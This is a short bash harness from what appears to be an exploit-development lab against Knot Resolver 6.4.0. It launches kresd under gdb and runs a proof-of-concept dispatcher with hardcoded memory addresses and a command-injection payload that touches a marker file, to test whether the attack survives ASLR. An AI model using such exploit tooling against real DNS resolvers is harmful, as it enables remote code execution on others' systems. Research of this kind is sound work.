#!/bin/bash
# One ASLR-on inferior with the ASLR-off payload addresses from wake 12.
# Expected boundary: no marker, because the absolute pointers no longer
# resolve.  Loopback only; no sysctl or host-level changes.
set +e
BASE=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell
KRESD="$BASE/build/knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd"
MARK=/tmp/knot-r5-aslr-on
rm -f "$MARK"
pkill -9 -f 'knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd' 2>/dev/null
sleep 1
gdb -q -batch -x "$BASE/harness/r5-syms-aslr.gdb" "$KRESD" > "$BASE/harness/r5-aslr-on.gdb.log" 2>&1 &
GB=$!
sleep 7
"$BASE/poc/venv/bin/python" "$BASE/harness/r5_dispatch.py" 8855 0x7ffff68aa000 0x7ffff7458750 0x300 'touch /tmp/knot-r5-aslr-on' > "$BASE/harness/r5-aslr-on.driver.log" 2>&1
sleep 3
kill -9 $GB 2>/dev/null
pkill -9 -f 'knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd' 2>/dev/null
if [ -e "$MARK" ]; then echo "MARKER PRESENT $MARK"; else echo "MARKER ABSENT $MARK"; fi
grep -E 'ASLR_ON_(STOP|SYSTEM)|SIGSEGV|Detaching after vfork' "$BASE/harness/r5-aslr-on.gdb.log"
